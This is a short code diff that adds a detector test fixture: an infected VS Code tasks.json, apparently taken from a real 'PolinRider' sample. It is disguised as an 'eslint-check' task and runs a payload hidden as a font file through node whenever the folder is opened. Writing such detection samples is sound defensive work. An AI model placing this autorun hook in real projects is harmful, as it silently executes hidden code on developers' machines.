@@ -112,3 +112,22 @@ export const LEGIT_LAUNCH = `{
   ]
 }
 `;
+
+// Real-world PolinRider tasks.json: a folderOpen task that runs the payload font
+// through node (no curl/URL — the old fetch-to-shell detector missed this).
+export const INFECTED_TASKS_NODE = `{
+  "version": "2.0.0",
+  "configurations": [
+    { "type": "node", "request": "launch", "name": "Run My Project" }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2)",
+      "isBackground": true,
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
+`;
